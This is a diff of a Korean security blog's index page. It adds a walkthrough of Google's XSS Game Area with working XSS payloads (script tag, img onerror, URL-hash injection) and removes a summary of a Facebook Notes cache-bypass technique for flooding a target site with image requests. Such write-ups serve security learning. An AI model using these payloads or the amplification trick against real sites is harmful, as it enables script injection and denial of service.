@@ -9,9 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="기본적인 툴들을 인스톨한다. Android shell 은 MirBSD Korn shell. 불편하니 sshd 나 dropbear 를 인스톨한다.
-Android 의 대부분의 CLI 커맨드는 toolbox 로 구현되었다. busybox 를 인스톨한다.
-Emulator 의 &hellip;">
+  <meta name="description" content="Google XSS Game Area Level 1 Search form 에 a&lt;script&gt;alert('hi');&lt;/script&gt; Level 2 &lt;blockquote&gt; 안에서도 &lt;img&gt; 는 먹으니까. &lt;img src &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +65,70 @@ Emulator 의 &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/01/google-xss-game-area/">Google XSS Game Area</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-01T18:52:28+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>6:52 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://xss-game.appspot.com/">Google XSS Game Area</a></p>
+
+<h3>Level 1</h3>
+
+<p>Search form 에</p>
+
+<pre><code>a&lt;script&gt;alert('hi');&lt;/script&gt;
+</code></pre>
+
+<h3>Level 2</h3>
+
+<pre><code>&lt;blockquote&gt; 안에서도 &lt;img&gt; 는 먹으니까. &lt;img src='hi.jpg' onerror='alert("hi");'&gt;
+</code></pre>
+
+<h3>Level 3</h3>
+
+<pre><code>function chooseTab(num) {
+    ...
+    html += "&lt;img src='/static/level3/cloud" + num + ".jpg' /&gt;"
+    $('#tabContent').html(html);
+
+    window.location.hash = num;
+    ...
+}
+...
+window.onload = function() {
+    if (event.source == parent) {
+        chooseTab(self.location.hash.substr(1));
+    }
+}
+</code></pre>
+
+<p>URL 의 hash 부분에 html 이 influenced 되니까, 브라우저의 URL 표시창의 <code>#</code> 뒷부분에 입력한다.</p>
+
+<pre><code>#'onerror="alert('hi');"&gt;
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1101,56 +1163,6 @@ C++ object 의 ctable pointer 를 0x0c0c0c0c 로 overwrite 했고,
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/04/28/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS Any Website</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-04-28T08:43:15+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:43 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website/">Using Facebook Notes to DDoS any website</a></p>
-
-<p>요약해본다.</p>
-
-<p>Step 1. Facebook Notes 는 <code>&lt;img&gt;</code> 태그를 받아준다. 원 소스에서 가져다가 캐쉬하는데, 파라메터를 쓰면 caching 을 바이패스할 수 있다.</p>
-
-<pre><code>&lt;img src=http://targethost/file?=1&gt;&lt;/img&gt;
-&lt;img src=http://targethost/file?=2&gt;&lt;/img&gt;
-&lt;img src=http://targethost/file?=3&gt;&lt;/img&gt;
-&lt;img src=http://targethost/file?=4&gt;&lt;/img&gt;
-...
-&lt;img src=http://targethost/file?=1000&gt;&lt;/img&gt;
-</code></pre>
-
-<p>Step 2. 이제 m.facebook.com 을 사용해 <code>note</code> 를 만든다. 900 언저리에서 사이즈 제한으로 짤릴 것이다.</p>
-
-<p>Step 3. 동일한 내용으로 <code>note</code> 를 십여개 만든다. 이제 글 하나당 약 900 ~ 1000 개의 http request 공격이 된다.</p>
-
-<p>Step 4. 이 <code>note</code> 들을 한꺼번에 본다. 타겟 서버는 9000 (900 x 10) 개의 http request 을 받게 된다.</p>
-
-<p>많은 DDoS trick 의 요체는 input size v.s. output size 의 비대칭이다.
-내가 가진 제한된 upstream bandwidth 에 비해 대단히 비대칭적인 size 의 output packet 을 만들어낼 수 있냐가 핵심이다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/16">&larr; Older</a>
@@ -1168,6 +1180,10 @@ C++ object 의 ctable pointer 를 0x0c0c0c0c 로 overwrite 했고,
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
       </li>
     
@@ -1181,10 +1197,6 @@ C++ object 의 ctable pointer 를 0x0c0c0c0c 로 overwrite 했고,
     
       <li class="post">
         <a href="/blog/2016/02/11/racing-midi-messages-in-chrome/">Racing MIDI Messages in Chrome</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/11/unlocking-the-motorola-bootloader/">Unlocking the Motorola Bootloader</a>
       </li>
     
   </ul>
